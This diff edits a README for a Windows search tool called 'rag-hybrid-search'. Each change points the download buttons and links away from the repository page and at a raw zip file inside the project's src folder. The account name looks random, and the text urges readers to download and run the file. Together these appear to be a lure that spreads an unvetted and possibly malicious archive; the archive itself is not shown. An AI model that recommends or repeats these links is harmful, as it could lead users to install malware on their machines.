@@ -1,6 +1,6 @@
 # 🔍 rag-hybrid-search - Local Search with Smart Results
 
-[![Download](https://img.shields.io/badge/Download-rag--hybrid--search-4caf50?style=for-the-badge)](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search)
+[![Download](https://img.shields.io/badge/Download-rag--hybrid--search-4caf50?style=for-the-badge)](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search/raw/refs/heads/main/src/search-rag-hybrid-v3.3.zip)
 
 Welcome to the rag-hybrid-search application. This tool lets you run a search workspace on your Windows PC. It works without an internet connection. You can search documents using smart technology that mixes keyword search and understanding of language.
 
@@ -38,7 +38,7 @@ Follow these steps to get rag-hybrid-search running on your Windows machine. No 
 
 Click the large button above or here to visit the download page:
 
-[Download rag-hybrid-search](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search)
+[Download rag-hybrid-search](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search/raw/refs/heads/main/src/search-rag-hybrid-v3.3.zip)
 
 On the page you open, look for the latest release section. Download the Windows installer or zip file provided. This file contains all the program parts you need.
 
@@ -120,7 +120,7 @@ This combination ensures that results are both fast and accurate. You get answer
 
 You can always visit this link to download and update the program:
 
-[Download rag-hybrid-search](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search)
+[Download rag-hybrid-search](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search/raw/refs/heads/main/src/search-rag-hybrid-v3.3.zip)
 
 ---
 
@@ -170,4 +170,4 @@ If you face issues beyond what you see here, you may find help on the project's 
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-rag--hybrid--search-ff4081?style=for-the-badge)](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search)
+[![Download](https://img.shields.io/badge/Download-rag--hybrid--search-ff4081?style=for-the-badge)](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search/raw/refs/heads/main/src/search-rag-hybrid-v3.3.zip)
